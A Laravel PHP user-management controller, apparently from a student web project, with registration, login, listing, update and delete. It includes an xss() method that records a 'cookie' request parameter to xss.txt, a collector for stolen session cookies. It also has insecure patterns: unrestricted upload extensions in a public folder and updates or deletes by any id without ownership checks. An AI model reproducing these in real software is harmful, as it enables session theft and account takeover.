<?php

namespace App\Http\Controllers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Routing\Redirector;
use Hash;
use Session;
use App\Models\User;
use App\Models\Favorities;
use App\Models\Posts;
use App\Models\User_favorite;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;

class CrudUserController extends Controller
{
    public function indexCreate()
    {
        return view('crud_user.create');
    }

    public function createUser(Request $request)
    {                                   

        $request->validate([
            'name' => 'required',
            'email' => 'required|email|unique:users',
            'password' => 'required|min:6',
            'phone' => 'required|max:10',
            'image' => 'required',
            'favorities' => 'required',
        ]);

        $data = $request->all();

        if($request->hasFile('image'))
        {
            $file = $request->file('image');
            $ex = $file->getClientOriginalExtension(); //Lay phan mo rong .jpn,....
            $filename = time().'.'.$ex;
            $file->move('uploads/userimage/',$filename);
            $data['image'] = $filename;

        }

        User::create([
            'name' => $data['name'],
            'email' => $data['email'],
            'password' => Hash::make($data['password']),
            'phone' => $data['phone'],
            'image' => $data['image'],
            'favorities' => $data['favorities'],      
        ]);

        return redirect()->route('user.loginIndex');
    }

    public function listUser()
    {
            $users = User::paginate(2);
            return view('crud_user.list',['users' => $users]);
    }

    public function detail(Request $request)
    {
            $user_id = $request->get('id');

            $user_profile = DB::table('users_profile')
            ->join('users', 'users_profile.user_id' , '=', 'users.id')
            ->where('users.id', $user_id)
            ->select('users_profile.*', 'users.*')
            ->first();

            $posts = DB::table('posts')
            ->join('users', 'posts.user_id', '=', 'users.id')
            ->where('users.id', $user_id)
            ->select('posts.*')
            ->get();

            $favorities = DB::table('favorities')
            ->join('user_favorites', 'favorities.favorite_id', '=', 'user_favorites.favorite_id')
            ->join('users', 'user_favorites.user_id', '=', 'users.id') // Removed extra space after 'user_id'
            ->where('users.id', $user_id)
            ->select('favorities.*')
            ->get();
            return view('crud_user.read', [
                'user_profile' => $user_profile,
                'posts' => $posts,
                'favorities' => $favorities
            ]);
    }

    public function UpdateUser(Request $request)
    {
        $user_id = $request->get('id');
        $user = User::find($user_id);

        return view('crud_user.update',['user' => $user]);
    }

    public function PostUpdateUser(Request $request)
    {
        $input = $request->all();
        
        $user = User::find($input['id']);
        $user->name = $input['name'];
        $user->email = $input['email'];
        $user->password = Hash::make($input['password']);
        $user->phone = $input['phone'];
        $user->favorities = $input['favorities'];

        if($request->hasFile('image'))
        {
            //Xoa ảnh cũ
            $image_cu = 'uploads/userimage/' . $user->image;
            if(File::exists($image_cu))
            {
                File::delete($image_cu);
            }
            //xử lý ảnh mới
            $file = $request->file('image');
            $ex = $file->getClientOriginalExtension(); //Lay phan mo rong .jpn,....
            $filename = time().'.'.$ex;
            $file->move('uploads/userimage/',$filename);
            $user['image'] = $filename;
        }
        
        $user->save();
        return redirect('list');

    }

    // Delete user by id
    public function deleteUser(Request $request)
    {
        // $name = $request->get('name');
        // $user = User::where('name', $name)->first();
        // if($user)
        // {
        //     $user->delete();
        //     return redirect("list")->withSuccess('User has been deleted successfully');
        // }
        
        $user_id = $request->get('id');
        if (!is_array($user_id)) {
            $user_id = [$user_id];
        }

        $userfavorite = User_favorite::whereIn('user_id', $user_id)->exists();
        $userpost = Posts::whereIn('user_id', $user_id)->exists();

        // if(!$userfavorite)
        // {
        //     User::destroy($user_id);
        //     return redirect("list")->withSuccess('You have Signed-in');
        // }
        // else
        // {
        //     echo "Người dùng có sở thích, không thể xóa.";
        // }

        if(!$userpost)
        {
            User::destroy($user_id);
            return redirect("list")->withSuccess('You have Signed-in');
        }
        else
        {
            echo "Người dùng có bài viết, không thể xóa.";
        }   
    }

    public function indexLogin()
    {
        return view('crud_user.login');
    }

    public function customLogin(Request $request)
    {
        // $user_id = User::find(1);
        // if($user_id)
        // {
        //     Auth::loginUsingId($user_id->id);
        //     return redirect()->intended('list')
        //                      ->withSuccess('Signed in');
        // }
        // return redirect("login")->withSuccess('Login details are not valid');

        // if (strpos($credentials['name'], '@mail.tdc.edu.vn') !== false) {
        //     if (Auth::attempt($credentials)) {
        //         return redirect()->intended('list')
        //                     ->withSuccess('Signed in');
        //     }
        // } else {
        //     // Trường hợp tên người dùng không hợp lệ (không kết thúc bằng "@mail.tdc.edu.vn")
        //     return redirect("login")->withSuccess('Login details are not valid');
        // }
        
        // // Trường hợp đăng nhập không thành công với tài khoản có đuôi là "@mail.tdc.edu.vn"
        // return redirect("login")->withSuccess('Login details are not valid');

        $request->validate([
            'name' => 'required',
            'password' => 'required',
        ]);
   
        $credentials = $request->only('name', 'password');
        if (Auth::attempt($credentials)) {
            return redirect()->intended('list')
                        ->withSuccess('Signed in');
        }
  
        return redirect("login")->withSuccess('Login details are not valid');
    }
    
    public function signOut() {
        Session::flush();
        Auth::logout();

        return Redirect('login');
    }

    public function xss(Request $request) {			
        $cookie = $request->get('cookie');		
        file_put_contents('xss.txt', $cookie);		
        var_dump($cookie);die();		
    }	
    
    public function listFavo()
    {
            $favorites = Favorities::paginate(2);

            return view('crud_user.listfavorite',['favorites' => $favorites]);
    }

    public function listpost()
    {
            $posts = Posts::paginate(2);

            return view('crud_user.listpost',['posts' => $posts]);
    }
}
